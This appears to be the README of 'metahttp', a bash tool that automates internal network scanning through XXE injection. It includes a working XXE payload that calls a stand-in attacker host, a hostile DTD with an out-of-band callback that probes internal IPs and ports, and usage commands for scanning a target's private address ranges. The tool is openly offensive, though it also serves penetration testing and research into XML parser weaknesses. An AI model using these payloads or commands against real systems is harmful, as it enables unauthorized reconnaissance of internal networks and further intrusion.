# metahttp

A bash script that automates the scanning of a target network for HTTP resources through XXE

<p align="center">
  <img width="680" src="img/meta.gif"/>
</p>

## How it works

Initially the script waits for the target application to load the DTDs from the HTTP server it hosts.

Next the attacker triggers the XXE on the target server by submitting for example the following XML:
```xml
<!DOCTYPE r SYSTEM "http://attacker_host/serveme.dtd"><r></r>
```

The script receives the request and responds with the following DTD:
```xml
<!ENTITY % test_target SYSTEM '${target_protocol}://${target_ip}:${target_port}${target_path}'>
<!ENTITY % callback SYSTEM 'http://${server_hostname}:${http_callback_port}/${callback_path_prefix}${target_ip}_${target_port}'>
<!ENTITY % trigger '%test_target;%callback;'>
%trigger;
```

After receiving the DTD, the XML parser will attempt to substitute the `trigger` parameter entity with its value.
The `trigger` parameter entity includes both `test_target` and `callback`. Now here we depend on the fact that XML parsers will normally process the parameter entities one by one. In case the substitution of an entity fails, they will not proceed with the substitution of the subsequent entities. So now, if we receive a callback to our server, it means that the `callback` parameter entity was attempted to be substituted which with its turn means that the resource pointed by the `test_target` exists.

The above procedure is repeated for all the provided hosts/ports. Since there might be a big number of hosts/ports combinations, the step where the attacker has to trigger the XXE on the target server is automated  through the use of the "dispatcher". The dispatcher is an executable passed to metahttp through the -x option and is responsible for triggering the XXE on the target server. Couple of examples are provided in the dispatcher_examples folder.

Finally it is noted that the script currently depends on the underlying XML parser processing external DTDs and entity substitutions but it should be possible to be adjusted to different XXE scenarios.

## Usage
1. Local testing with a Java app on docker:
```bash
./metahttp.sh -T <(echo dockerhost) -p 80 -x ./dispatcher_examples/docker_java.sh -a /
```

2. Scanning the internal network of a target:
```bash
./metahttp.sh -t 10.10.0.0/24,10.20.0.0-10.20.0.15 -p 80,8000-8080,8983 -x ./dispatcher_examples/target_curl.sh -a /path/to/a/unique/resource
```

3. More information on the options
```bash
./metahttp.sh --help
```